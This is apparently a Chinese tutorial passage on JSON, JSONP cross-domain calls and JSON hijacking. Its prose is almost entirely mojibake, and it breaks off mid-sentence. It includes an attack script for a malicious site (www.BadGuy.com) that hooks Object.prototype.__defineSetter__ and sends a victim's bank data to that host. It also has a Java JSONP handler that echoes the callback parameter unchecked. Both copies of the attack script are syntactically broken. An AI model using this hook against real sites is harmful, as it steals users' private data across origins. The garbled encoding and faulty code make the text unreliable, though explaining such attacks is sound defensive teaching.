    <content type="text"><![CDATA[json‰ª•ÂèäjsonpÂâçË®ÄJSONPÂÖ®Âêç‰∏∫JSON with PaddingÔºåÂÖ∂Â≠òÂú®ÁöÑÊÑè‰πâ‰æøÊúâÁªïËøáËØ∏Â¶ÇÂêåÊ∫êÁ≠ñÁï•Âº∫Âà∂ÊâßË°åXMLHttpRequest(AJAX requests)„ÄÇÊòØÂü∫‰∫é JSON Ê†ºÂºèÁöÑ‰∏∫Ëß£ÂÜ≥Ë∑®ÂüüËØ∑Ê±ÇËµÑÊ∫êËÄå‰∫ßÁîüÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ‰ªñÂÆûÁé∞ÁöÑÂü∫Êú¨ÂéüÁêÜÊòØÂà©Áî®‰∫Ü HTML Èáå ÂÖÉÁ¥†Ê†áÁ≠æÔºåËøúÁ®ãË∞ÉÁî® JSON Êñá‰ª∂Êù•ÂÆûÁé∞Êï∞ÊçÆ‰º†ÈÄí„ÄÇÂ¶ÇË¶ÅÂú® a.com Âüü‰∏ãËé∑ÂèñÂ≠òÂú® b.com ÁöÑ JSON Êï∞ÊçÆ( getUsers.JSON ): JSONP(JSON with Padding)ÊòØ‰∏Ä‰∏™ÈùûÂÆòÊñπÁöÑÂçèËÆÆÔºåÂÆÉÂÖÅËÆ∏Âú®ÊúçÂä°Âô®Á´ØÈõÜÊàêScript tagsËøîÂõûËá≥ÂÆ¢Êà∑Á´ØÔºåÈÄöËøájavascript callbackÁöÑÂΩ¢ÂºèÂÆûÁé∞Ë∑®ÂüüËÆøÈóÆÔºàËøô‰ªÖ‰ªÖÊòØJSONPÁÆÄÂçïÁöÑÂÆûÁé∞ÂΩ¢ÂºèÔºâ„ÄÇ JSONPÊ≥®ÂÖ•ÊòØ‰∏Ä‰∏™‰∏çÂ§™Â∏∏ËßÅ‰ΩÜÂΩ±ÂìçÈùûÂ∏∏ÂπøÊ≥õ‰∏îÊûÅÂç±Èô©ÁöÑÊºèÊ¥ûÔºåÁî±‰∫éÊúÄËøëÂá†Âπ¥ÂØπJSON, web APIs‰ª•ÂèäË∑®ÂüüÈÄö‰ø°ÁöÑÈúÄÊ±ÇÂ¢ûÂ§öÔºå‰∏çÂæó‰∏çÂºïËµ∑Êàë‰ª¨ÁöÑÈáçËßÜ„ÄÇ jsonÂü∫Á°ÄJSONËÉΩÂ§ü‰ª•ÈùûÂ∏∏ÁÆÄÂçïÁöÑÊñπÂºèÊù•ÊèèËø∞Êï∞ÊçÆÁªìÊûÑÔºåXMLËÉΩÂÅöÁöÑÂÆÉÈÉΩËÉΩÂÅöÔºåÂõ†Ê≠§Âú®Ë∑®Âπ≥Âè∞ÊñπÈù¢‰∏§ËÄÖÂÆåÂÖ®‰∏çÂàÜ‰ºØ‰ª≤„ÄÇ1„ÄÅJSONÂè™Êúâ‰∏§ÁßçÊï∞ÊçÆÁ±ªÂûãÊèèËø∞Á¨¶ÔºåÂ§ßÊã¨Âè∑{}ÂíåÊñπÊã¨Âè∑[]ÔºåÂÖ∂‰ΩôËã±ÊñáÂÜíÂè∑:ÊòØÊò†Â∞ÑÁ¨¶ÔºåËã±ÊñáÈÄóÂè∑,ÊòØÂàÜÈöîÁ¨¶ÔºåËã±ÊñáÂèåÂºïÂè∑‚Äù‚ÄúÊòØÂÆö‰πâÁ¨¶„ÄÇ2„ÄÅÂ§ßÊã¨Âè∑{}Áî®Êù•ÊèèËø∞‰∏ÄÁªÑ‚Äú‰∏çÂêåÁ±ªÂûãÁöÑÊó†Â∫èÈîÆÂÄºÂØπÈõÜÂêà‚ÄùÔºàÊØè‰∏™ÈîÆÂÄºÂØπÂèØ‰ª•ÁêÜËß£‰∏∫OOPÁöÑÂ±ûÊÄßÊèèËø∞ÔºâÔºåÊñπÊã¨Âè∑[]Áî®Êù•ÊèèËø∞‰∏ÄÁªÑ‚ÄúÁõ∏ÂêåÁ±ªÂûãÁöÑÊúâÂ∫èÊï∞ÊçÆÈõÜÂêà‚ÄùÔºàÂèØÂØπÂ∫îOOPÁöÑÊï∞ÁªÑÔºâ„ÄÇ3„ÄÅ‰∏äËø∞‰∏§ÁßçÈõÜÂêà‰∏≠Ëã•ÊúâÂ§ö‰∏™Â≠êÈ°πÔºåÂàôÈÄöËøáËã±ÊñáÈÄóÂè∑,ËøõË°åÂàÜÈöî„ÄÇ4„ÄÅÈîÆÂÄºÂØπ‰ª•Ëã±ÊñáÂÜíÂè∑:ËøõË°åÂàÜÈöîÔºåÂπ∂‰∏îÂª∫ËÆÆÈîÆÂêçÈÉΩÂä†‰∏äËã±ÊñáÂèåÂºïÂè∑‚Äù‚ÄúÔºå‰ª•‰æø‰∫é‰∏çÂêåËØ≠Ë®ÄÁöÑËß£Êûê„ÄÇ5„ÄÅJSONÂÜÖÈÉ®Â∏∏Áî®Êï∞ÊçÆÁ±ªÂûãÊó†ÈùûÂ∞±ÊòØÂ≠óÁ¨¶‰∏≤„ÄÅÊï∞Â≠ó„ÄÅÂ∏ÉÂ∞î„ÄÅÊó•Êúü„ÄÅnull Ëøô‰πàÂá†‰∏™ÔºåÂ≠óÁ¨¶‰∏≤ÂøÖÈ°ªÁî®ÂèåÂºïÂè∑ÂºïËµ∑Êù•ÔºåÂÖ∂‰ΩôÁöÑÈÉΩ‰∏çÁî®ÔºåÊó•ÊúüÁ±ªÂûãÊØîËæÉÁâπÊÆäÔºåËøôÈáåÂ∞±‰∏çÂ±ïÂºÄËÆ≤Ëø∞‰∫ÜÔºåÂè™ÊòØÂª∫ËÆÆÂ¶ÇÊûúÂÆ¢Êà∑Á´ØÊ≤°ÊúâÊåâÊó•ÊúüÊéíÂ∫èÂäüËÉΩÈúÄÊ±ÇÁöÑËØùÔºåÈÇ£‰πàÊääÊó•ÊúüÊó∂Èó¥Áõ¥Êé•‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤‰º†ÈÄíÂ∞±Â•ΩÔºåÂèØ‰ª•ÁúÅÂéªÂæàÂ§öÈ∫ªÁÉ¶„ÄÇ jsonÂÆû‰æã// ÊèèËø∞‰∏Ä‰∏™‰∫∫ var person = { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true } // Ëé∑ÂèñËøô‰∏™‰∫∫ÁöÑ‰ø°ÊÅØ var personAge = person.Age; // ÊèèËø∞Âá†‰∏™‰∫∫ var members = [ { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true }, { &quot;Name&quot;: &quot;John&quot;, &quot;Age&quot;: 20, &quot;Company&quot;: &quot;Oracle&quot;, &quot;Engineer&quot;: false }, { &quot;Name&quot;: &quot;Henry&quot;, &quot;Age&quot;: 45, &quot;Company&quot;: &quot;Microsoft&quot;, &quot;Engineer&quot;: false } ] // ËØªÂèñÂÖ∂‰∏≠JohnÁöÑÂÖ¨Âè∏ÂêçÁß∞ var johnsCompany = members[1].Company; // ÊèèËø∞‰∏ÄÊ¨°‰ºöËÆÆ var conference = { &quot;Conference&quot;: &quot;Future Marketing&quot;, &quot;Date&quot;: &quot;2012-6-1&quot;, &quot;Address&quot;: &quot;Beijing&quot;, &quot;Members&quot;: [ { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true }, { &quot;Name&quot;: &quot;John&quot;, &quot;Age&quot;: 20, &quot;Company&quot;: &quot;Oracle&quot;, &quot;Engineer&quot;: false }, { &quot;Name&quot;: &quot;Henry&quot;, &quot;Age&quot;: 45, &quot;Company&quot;: &quot;Microsoft&quot;, &quot;Engineer&quot;: false } ] } // ËØªÂèñÂèÇ‰ºöËÄÖHenryÊòØÂê¶Â∑•Á®ãÂ∏à var henryIsAnEngineer = conference.Members[2].Engineer;‰ªÄ‰πàÊòØjsonp1„ÄÅ‰∏Ä‰∏™‰ºóÊâÄÂë®Áü•ÁöÑÈóÆÈ¢òÔºåAjaxÁõ¥Êé•ËØ∑Ê±ÇÊôÆÈÄöÊñá‰ª∂Â≠òÂú®Ë∑®ÂüüÊó†ÊùÉÈôêËÆøÈóÆÁöÑÈóÆÈ¢òÔºåÁî≠ÁÆ°‰Ω†ÊòØÈùôÊÄÅÈ°µÈù¢„ÄÅÂä®ÊÄÅÁΩëÈ°µ„ÄÅwebÊúçÂä°„ÄÅWCFÔºåÂè™Ë¶ÅÊòØË∑®ÂüüËØ∑Ê±ÇÔºå‰∏ÄÂæã‰∏çÂáÜÔºõ 2„ÄÅ‰∏çËøáÊàë‰ª¨ÂèàÂèëÁé∞ÔºåWebÈ°µÈù¢‰∏äË∞ÉÁî®jsÊñá‰ª∂Êó∂Âàô‰∏çÂèóÊòØÂê¶Ë∑®ÂüüÁöÑÂΩ±ÂìçÔºà‰∏ç‰ªÖÂ¶ÇÊ≠§ÔºåÊàë‰ª¨ËøòÂèëÁé∞Âá°ÊòØÊã•Êúâ‚Äùsrc‚ÄùËøô‰∏™Â±ûÊÄßÁöÑÊ†áÁ≠æÈÉΩÊã•ÊúâË∑®ÂüüÁöÑËÉΩÂäõÔºåÊØîÂ¶Çscript„ÄÅimg„ÄÅiframeÔºâÔºõ 3„ÄÅ‰∫éÊòØÂèØ‰ª•Âà§Êñ≠ÔºåÂΩìÂâçÈò∂ÊÆµÂ¶ÇÊûúÊÉ≥ÈÄöËøáÁ∫ØwebÁ´ØÔºàActiveXÊéß‰ª∂„ÄÅÊúçÂä°Á´Ø‰ª£ÁêÜ„ÄÅÂ±û‰∫éÊú™Êù•ÁöÑHTML5‰πãWebsocketÁ≠âÊñπÂºè‰∏çÁÆóÔºâË∑®ÂüüËÆøÈóÆÊï∞ÊçÆÂ∞±Âè™Êúâ‰∏ÄÁßçÂèØËÉΩÔºåÈÇ£Â∞±ÊòØÂú®ËøúÁ®ãÊúçÂä°Âô®‰∏äËÆæÊ≥ïÊääÊï∞ÊçÆË£ÖËøõjsÊ†ºÂºèÁöÑÊñá‰ª∂ÈáåÔºå‰æõÂÆ¢Êà∑Á´ØË∞ÉÁî®ÂíåËøõ‰∏ÄÊ≠•Â§ÑÁêÜÔºõ 4„ÄÅÊÅ∞Â∑ßÊàë‰ª¨Â∑≤ÁªèÁü•ÈÅìÊúâ‰∏ÄÁßçÂè´ÂÅöJSONÁöÑÁ∫ØÂ≠óÁ¨¶Êï∞ÊçÆÊ†ºÂºèÂèØ‰ª•ÁÆÄÊ¥ÅÁöÑÊèèËø∞Â§çÊùÇÊï∞ÊçÆÔºåÊõ¥Â¶ôÁöÑÊòØJSONËøòË¢´jsÂéüÁîüÊîØÊåÅÔºåÊâÄ‰ª•Âú®ÂÆ¢Êà∑Á´ØÂá†‰πéÂèØ‰ª•ÈöèÂøÉÊâÄÊ¨≤ÁöÑÂ§ÑÁêÜËøôÁßçÊ†ºÂºèÁöÑÊï∞ÊçÆÔºõ 5„ÄÅËøôÊ†∑Â≠êËß£ÂÜ≥ÊñπÊ°àÂ∞±Âëº‰πãÊ¨≤Âá∫‰∫ÜÔºåwebÂÆ¢Êà∑Á´ØÈÄöËøá‰∏éË∞ÉÁî®ËÑöÊú¨‰∏ÄÊ®°‰∏ÄÊ†∑ÁöÑÊñπÂºèÔºåÊù•Ë∞ÉÁî®Ë∑®ÂüüÊúçÂä°Âô®‰∏äÂä®ÊÄÅÁîüÊàêÁöÑjsÊ†ºÂºèÊñá‰ª∂Ôºà‰∏ÄËà¨‰ª•JSON‰∏∫ÂêéÁºÄÔºâÔºåÊòæËÄåÊòìËßÅÔºåÊúçÂä°Âô®‰πãÊâÄ‰ª•Ë¶ÅÂä®ÊÄÅÁîüÊàêJSONÊñá‰ª∂ÔºåÁõÆÁöÑÂ∞±Âú®‰∫éÊääÂÆ¢Êà∑Á´ØÈúÄË¶ÅÁöÑÊï∞ÊçÆË£ÖÂÖ•ËøõÂéª„ÄÇ ÔºàÈáçÁÇπ‚ÄìÁÆÄËÄåË®Ä‰πã„ÄÇÊàë‰ª¨Ë¶ÅÂä†ËΩΩËøúÁ®ãÊñá‰ª∂ËÄåjsÂèàÂèØ‰ª•Ë∑®ÂüüÔºåÈÇ£‰πàÊàë‰ª¨Ë∑®ÂüüË∞ÉÁî®ËøúÁ®ãjsÊñá‰ª∂Ôºå‰æøÂèØ‰ª•ÂÆûÁé∞ÂêåÊ∫êÁ≠ñÁï•‰πã‰∏ãÁöÑË∑®ÂüüÔºâ 6„ÄÅÂÆ¢Êà∑Á´ØÂú®ÂØπJSONÊñá‰ª∂Ë∞ÉÁî®ÊàêÂäü‰πãÂêéÔºå‰πüÂ∞±Ëé∑Âæó‰∫ÜËá™Â∑±ÊâÄÈúÄÁöÑÊï∞ÊçÆÔºåÂâ©‰∏ãÁöÑÂ∞±ÊòØÊåâÁÖßËá™Â∑±ÈúÄÊ±ÇËøõË°åÂ§ÑÁêÜÂíåÂ±ïÁé∞‰∫ÜÔºåËøôÁßçËé∑ÂèñËøúÁ®ãÊï∞ÊçÆÁöÑÊñπÂºèÁúãËµ∑Êù•ÈùûÂ∏∏ÂÉèAJAXÔºå‰ΩÜÂÖ∂ÂÆûÂπ∂‰∏ç‰∏ÄÊ†∑„ÄÇ 7„ÄÅ‰∏∫‰∫Ü‰æø‰∫éÂÆ¢Êà∑Á´Ø‰ΩøÁî®Êï∞ÊçÆÔºåÈÄêÊ∏êÂΩ¢Êàê‰∫Ü‰∏ÄÁßçÈùûÊ≠£Âºè‰º†ËæìÂçèËÆÆÔºå‰∫∫‰ª¨ÊääÂÆÉÁß∞‰ΩúJSONPÔºåËØ•ÂçèËÆÆÁöÑ‰∏Ä‰∏™Ë¶ÅÁÇπÂ∞±ÊòØÂÖÅËÆ∏Áî®Êà∑‰º†ÈÄí‰∏Ä‰∏™callbackÂèÇÊï∞ÁªôÊúçÂä°Á´ØÔºåÁÑ∂ÂêéÊúçÂä°Á´ØËøîÂõûÊï∞ÊçÆÊó∂‰ºöÂ∞ÜËøô‰∏™callbackÂèÇÊï∞‰Ωú‰∏∫ÂáΩÊï∞ÂêçÊù•ÂåÖË£π‰ΩèJSONÊï∞ÊçÆÔºåËøôÊ†∑ÂÆ¢Êà∑Á´ØÂ∞±ÂèØ‰ª•ÈöèÊÑèÂÆöÂà∂Ëá™Â∑±ÁöÑÂáΩÊï∞Êù•Ëá™Âä®Â§ÑÁêÜËøîÂõûÊï∞ÊçÆ‰∫Ü„ÄÇ jsonpË∑®ÂüüÂÆû‰æãÂâçÁ´Øjsonp.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;p&gt;jsonpÊµãËØïÈ°µÈù¢&lt;/p&gt; &lt;meta charset=&quot;utf-8&quot; content=&quot;text/html; charset=gb2312&quot;/&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; // ÂæóÂà∞Ëà™Áè≠‰ø°ÊÅØÊü•ËØ¢ÁªìÊûúÂêéÁöÑÂõûË∞ÉÂáΩÊï∞ var flightHandler = function(data){ alert(&apos;‰Ω†Êü•ËØ¢ÁöÑËà™Áè≠ÁªìÊûúÊòØÔºöÁ•®‰ª∑ &apos; + data.price + &apos; ÂÖÉÔºå&apos; + &apos;‰ΩôÁ•® &apos; + data.tickets + &apos; Âº†„ÄÇ&apos;); }; // Êèê‰æõjsonpÊúçÂä°ÁöÑurlÂú∞ÂùÄÔºà‰∏çÁÆ°ÊòØ‰ªÄ‰πàÁ±ªÂûãÁöÑÂú∞ÂùÄÔºåÊúÄÁªàÁîüÊàêÁöÑËøîÂõûÂÄºÈÉΩÊòØ‰∏ÄÊÆµjavascript‰ª£Á†ÅÔºâ var url = &quot;http://127.0.0.1/999.js?code=CA1998&amp;callback=flightHandler&quot;;//ËøôÈáåÊàë‰ª¨Áõ¥Êé•ÂÜôÂú®‰∫ÜjsÈáå‰º†ÂèÇÔºåÂæàÂ§öÊòØÂú®getÁöÑÊñπÂºèurlÈáå‰º†ÂèÇÔºåËÄå‰∏çÊòØÂõ∫ÂÆöÂ•Ω‰∫ÜÁöÑ„ÄÇ // ÂàõÂª∫scriptÊ†áÁ≠æÔºåËÆæÁΩÆÂÖ∂Â±ûÊÄß var script = document.createElement(&apos;script&apos;); script.setAttribute(&apos;src&apos;, url); // ÊääscriptÊ†áÁ≠æÂä†ÂÖ•headÔºåÊ≠§Êó∂Ë∞ÉÁî®ÂºÄÂßã document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); &lt;/script&gt; &lt;/head&gt; &lt;/body&gt; &lt;/html&gt;ÂêéÁ´ØÂàôÊúâ‰∏Ä‰∏™ËßÑÂàôÁîüÊàê‰∫Ü‰∏ÄÊÆµËøôÊ†∑ÁöÑ‰ª£Á†ÅÊèê‰æõÁªôjsonp.htmlÔºàÊúçÂä°Á´ØÁöÑÂÆûÁé∞ËøôÈáåÂ∞±‰∏çÊºîÁ§∫‰∫ÜÔºå‰∏é‰Ω†ÈÄâÁî®ÁöÑËØ≠Ë®ÄÊó†ÂÖ≥ÔºåËØ¥Âà∞Â∫ïÂ∞±ÊòØÊãºÊé•Â≠óÁ¨¶‰∏≤ÔºâÔºö Á§∫‰æãÂõ∫ÂÆöÁöÑÂÜô‰∏Ä‰∏™json flightHandler({ &quot;code&quot;: &quot;CA1998&quot;, &quot;price&quot;: 1780, &quot;tickets&quot;: 5 });ÊïàÊûúÔºö ÈÄöËøá‰∏äËø∞ÊèèËø∞ÂèØ‰ª•Áü•ÈÅìÔºåËã•ÊÉ≥ÂÆûÁé∞JSONPÔºåÈô§‰∫ÜÂâçÁ´ØÈÉ®ÂàÜ‰πãÂ§ñÔºåËøòÈúÄË¶ÅÂêéÁ´ØÁöÑÈÖçÂêàÔºåÂêéÁ´ØÈúÄËøîÂõûÁ¨¶ÂêàJSONPË¶ÅÊ±ÇÁöÑÊï∞ÊçÆ„ÄÇÊØîÂ¶ÇjavaÂèØ‰ª•ËøôÊ†∑ÂÜôÔºö Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;(); map.put(&quot;result&quot;, &quot;content&quot;); String resultJSON = JSONObject.toJSONString(map); try { PrintWriter out = response.getWriter(); String jsonpCallback = request.getParameter(&quot;jsonpCallback&quot;);//ÂõûË∞ÉÂáΩÊï∞ out.println(jsonpCallback+&quot;(&quot;+resultJSON+&quot;)&quot;);//ËøîÂõûjsonpÊ†ºÂºèÊï∞ÊçÆ ÔºåË¶ÅÁî®callbackÂåÖË£Ö‰∏ã out.flush(); out.close(); } catch (Exception e) { e.printStackTrace(); } jsonÂä´ÊåÅÂéüÁêÜ Ôºà1Ôºâ.‰Ω†Ê≠£Â∏∏ËÆøÈóÆ‰ø°‰ªªÁ´ôÁÇπÔºàhttp://www.Bank.comÔºâÔºåÁÑ∂ÂêéÁôªÈôÜ‰ø°‰ªªÁ´ôÁÇπ„ÄÇ Ôºà2Ôºâ.‰ø°‰ªªÁ´ôÁÇπÈÄöËøá‰Ω†ÁöÑÈ™åËØÅÔºåÂπ∂ËøîÂõûCookie„ÄÇ Ôºà3Ôºâ.ËøôÊó∂ÔºåÂú®‰Ω†ËøòÊ≤°ÊúâÁôªÂá∫‰ø°‰ªªÁ´ôÁÇπ‰πãÂâçÔºå‰Ω†ÂÜçÊâìÂºÄ‰∫Ü‰∏Ä‰∏™ÊµèËßàÂô®ÁöÑtabÈ°µÔºåÂπ∂ËÆøÈóÆ‰∫Ü‰∏Ä‰∏™ÊÅ∂ÊÑèÁ´ôÁÇπÔºàwww.BadGuy.comÔºâ„ÄÇ Ôºà4Ôºâ.ÊÅ∂ÊÑèÁ´ôÁÇπÂêëËØ∑Ê±ÇÁî®Êà∑ËÆøÈóÆhttp://www.Bank.comÁöÑ‰∏Ä‰∏™ËµÑÊ∫ê„ÄÇ Ôºà5Ôºâ.ÊµèËßàÂô®Â∏¶ÁùÄ‰πãÂâçÁöÑCookie‰ø°ÊÅØÔºåÂêë‰ø°‰ªªÁ´ôÁÇπhttp://www.Bank.comÂèëÂá∫‰∫Ü‰∏Ä‰∏™GETËØ∑Ê±Ç„ÄÇ Ôºà6Ôºâ.‰ø°‰ªªÁ´ôÁÇπÈ™åËØÅÁöÑCookie‰ø°ÊÅØÈÄöËøáÔºåÊ†πÊçÆËØ∑Ê±ÇËøîÂõû‰∏Ä‰∏™JSONÊï∞ÁªÑÔºàÂ¶ÇÊûú‰∏çÊ∏ÖÊ•öJSONÔºåÂèØ‰ª•ÂèÇËÄÉ„ÄäJSONÂÖ•Èó®ÊåáÂçó„ÄãÔºâ„ÄÇ Ôºà7Ôºâ.‰Ω†ÁöÑÊµèËßàÂô®Êî∂Âà∞Êù•Ëá™http://www.Bank.comÁöÑÂìçÂ∫îÂêéÔºåËΩ¨ÂèëÂìçÂ∫î‰∏≠ÁöÑJSON‰ø°ÊÅØÁªôÊÅ∂ÊÑèÁ´ôÁÇπ„ÄÇ Ëá≥Ê≠§ÔºåÊÅ∂ÊÑèÁ´ôÁÇπÊãøÂà∞‰Ω†ÂÖ≥‰∫éhttp://www.Bank.comÁöÑ‰ø°ÊÅØ„ÄÇ Âà∞ËøôÈáåÔºå‰Ω†Â∫îËØ•ÊúâÂØπJavaScript HijackingÊúâ‰∏Ä‰∏™Â§ßÊ¶ÇÁöÑÊ¶ÇÂøµÔºåÂÆÉÁ°ÆÂÆûÂíåCSRFÂæàÁõ∏ÂÉèÔºåÂîØ‰∏Ä‰∏çÂêåÁöÑÊòØÔºåCSRFÊòØÊ®°Êãü‰Ω†ÁöÑË∫´‰ªΩÂéªÂèëÈÄÅËØ∑Ê±ÇÔºåJavaScript HijackingÊòØÊ®°Êãü‰Ω†ÁöÑË∫´‰ªΩÔºåÁ™ÉÂèñ‰Ω†Âú®ÊúçÂä°Âô®‰∏äÁöÑÁßÅÈöê‰ø°ÊÅØ„ÄÇ JavaScript HijackingÊîªÂáªÁ§∫ËåÉ‰ª£Á†ÅÔºöÊºîÁ§∫‰ª£Á†Å‰πãÂâçÔºåÈ¶ñÂÖàÊòéÁ°ÆÂá†ÁÇπÔºö Ôºà1Ôºâ.ÊÅ∂ÊÑèÁ´ôÁÇπÁöÑÊîªÂáªÁõÆÊ†áÊòØÊòéÁ°ÆÁöÑÔºàËøôÈáåÁõÆÊ†áÂ∞±ÊòØhttp://www.Bank.comÔºâ„ÄÇ Ôºà2Ôºâ.ÊÅ∂ÊÑèÁ´ôÁÇπÊòØÈÄöËøáÁî®Êà∑ÁªôÂÆÉËøîÂõû‰ø°‰ªªÁΩëÁ´ôÁöÑJSONÊï∞ÁªÑÔºà‰∏∫‰ªÄ‰πàÊòØJSONÊï∞ÁªÑÔºüÊôÆÈÄöÁöÑJSONÂØπË±°‰∏çË°å‰πàÔºüËøô‰∏™‰∏ãÈù¢‰ºöÊèêÂà∞ÔºÅÔºâÔºå‰ªéËÄåËé∑ÂèñÁî®Êà∑ÁßÅÈöê‰ø°ÊÅØÁöÑ„ÄÇ‰πüÂ∞±ÊòØËØ¥ÊâÄË∞ìÁöÑÈöêÁßÅÊï∞ÊçÆÔºå‰πüÂ∞±ÊòØËøô‰∫õJSONÊï∞ÁªÑÈáåÈù¢ÁöÑÊï∞ÊçÆÔºåÊâÄ‰ª•‰ø°‰ªªÁ´ôÁÇπËøîÂõûÁöÑ‰∏çÊòØJSONÊï∞ÁªÑÁöÑÊï∞ÊçÆÊàñËÄÖJSONÈáåÈù¢ÁöÑ‰ø°ÊÅØÊòØÂûÉÂúæ‰ø°ÊÅØÔºåÈÇ£‰πàËøô‰∏™ÊÅ∂ÊÑèÁ´ôÁÇπÊòØÂæíÂä≥ÁöÑ„ÄÇ Ôºà3Ôºâ.ÊÅ∂ÊÑèÁ´ôÁÇπÂøÖÈ°ªÂÆûÂÖàÁü•ÈÅìÁî®Êà∑ËøîÂõûÁöÑJSONÁöÑÁªìÊûÑ„ÄÇ Ôºà4Ôºâ.ÊÅ∂ÊÑèÁ´ôÁÇπËÉΩ‰∏îÂè™ËÉΩÂèëÈÄÅGETËØ∑Ê±Ç‚Ä¶‚Ä¶ Ôºà5Ôºâ.ËøôÁßçÊîªÂáªÊòØÈúÄË¶ÅÊµèËßàÂô®ÊîØÊåÅÁöÑÔºåËá≥‰∫é‰∏∫‰ªÄ‰πàÁúã‰∏ãÈù¢Âêß„ÄÇ ÊÅ©Ôºå‰∏ãÈù¢Áúã‰∏Ä‰∏ãÊîªÂáª‰ª£Á†ÅÂêß:&gt; Ëøô‰∏™ÊÅ∂ÊÑèÁ´ôÁÇπwww.BadGuy.comÈíàÂØπwww.Bank.comÁöÑÊîªÂáª‰ª£Á†ÅÔºö &lt;script type=&quot;text/javascript&quot;&gt; Object.prototype.__defineSetter__(&apos;money&apos;, function(obj) { var objString = &quot;&quot;; for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; } req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj=&quot; +escape(objString),true); } req.send(null); ); &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt;Âú®Áî®Êà∑ËÆøÈóÆÊÅ∂ÊÑèÁΩëÁ´ôÊó∂Ôºö &lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt;Ôºà1Ôºâ.ËøôÊÆµJS‰ª£Á†Å‰ºöË¶ÅÊ±ÇÊµèËßàÂô®ÂèëÈÄÅ‰∏Ä‰∏™GETËØ∑Ê±ÇÂà∞http://www.Bank.com/UserInfoÔºå‰∫éÊòØÊµèËßàÂô®ÊåâÁÖßÊåáÁ§∫ÔºåÂ∏¶‰∏äÊú¨Âú∞ÁöÑCookie‰ø°ÊÅØÔºåÂèëÈÄÅ‰∏Ä‰∏™httpÁöÑGETËØ∑Ê±Ç„ÄÇ Ôºà2Ôºâ.www.Bank.ComÊé•ÂèóÂà∞ËØ∑Ê±ÇÂêéÔºåÁ°ÆËÆ§Ë∫´‰ªΩÂêéÔºåÂìçÂ∫îËØ∑Ê±ÇËøîÂõû‰∫Ü‰∏Ä‰∏™JSONÊï∞ÁªÑ/JavaScript‰ª£Á†ÅÊÆµ„ÄÇ Ôºà3Ôºâ.ÂÆ¢Êà∑Á´ØÊé•ÂèóÂà∞ËøôÊÆµJSËÑöÊú¨ÂêéÔºåÂ¶ÇÊûúËøîÂõûÁöÑÊòØ‰∏Ä‰∏™JSONÊï∞ÁªÑÔºåÊØîÂ¶ÇÔºö [{&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000}]JSONÊï∞ÁªÑË¢´ËÆ§‰∏∫ÊòØ‰∏ÄÊÆµÂèØÊâßË°åÁöÑJavaScriptËÑöÊú¨Ôºå‰∫éÊòØÊµèËßàÂô®‰ºöËß£ÊûêÊâßË°å„ÄÇ Â¶ÇÊûúËøîÂõûÁöÑÊòØ‰∏Ä‰∏™JSONÂØπË±°Âë¢Ôºü {&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000}ÂëµÂëµÔºåËøô‰∏™ÊòØ‰∏ç‰ºöË¢´ÊµèËßàÂô®ÊâßË°åÁöÑÔºåÂõ†‰∏∫ÊµèËßàÂô®ËÆ§‰∏∫ÔºöÂÆÉ‰∏çÊòØ‰∏Ä‰∏™JavaScriptËÑöÊú¨„ÄÇ Â¶ÇÊûúÂÆÉËøîÂõûÁöÑÊòØ‰∏Ä‰∏™JavaScriptËÑöÊú¨ÁöÑËØùÔºåÊÅ©ÔºåËøôÂæóÂÖ∑‰ΩìÈóÆÈ¢òÂÖ∑‰ΩìÂàÜÊûê‰∫ÜÔºå‰∏ç‰∏ÄÂÆöËÉΩÊãøÂà∞‰ªÄ‰πàÊï∞ÊçÆ„ÄÇ Ôºà4Ôºâ.Áúã‰∏ãÈù¢ËøôÊÆµJavaScriptËÑöÊú¨Ôºö &lt;script type=&quot;text/javascript&quot;&gt; Object.prototype.__defineSetter__(&apos;Money&apos;, function(obj) { var objString = &quot;&quot;; for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; } req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj&quot;= +escape(objString),true); } req.send(null); ); &lt;/script&gt;ÂÆÉÁöÑ‰ΩúÁî®Â∞±ÊòØÂèëÈÄÅÂèóÂÆ≥ËÄÖÁöÑÁßÅÈöê‰ø°ÊÅØÂà∞ÊÅ∂ÊÑèÁ´ôÁÇπÁöÑ„ÄÇ ËøôÈáåÂèØËÉΩÊúâ‰∫∫‰∏çÁêÜËß£ÔºåÊàëÂ§ßÊ¶ÇËØ¥‰∏Ä‰∏ãÔºö Object.prototype.defineSetterÔºåÂèØ‰ª•ÁúãÂÅöÊòØJavaScript‰∏≠ÁöÑHookÔºàÊúâ‰∫∫ÊääËøô‰∏™Áß∞‰∏∫JavaScriptÂáΩÊï∞Âä´ÊåÅÔºåÊ≥®ÊÑèJavaScriptÁöÑÂáΩÊï∞Âä´ÊåÅÂíåJavaScript Hijacking‰∏çÊòØÂêå‰∏Ä‰∏™Ê¶ÇÂøµÔºåJavaScript 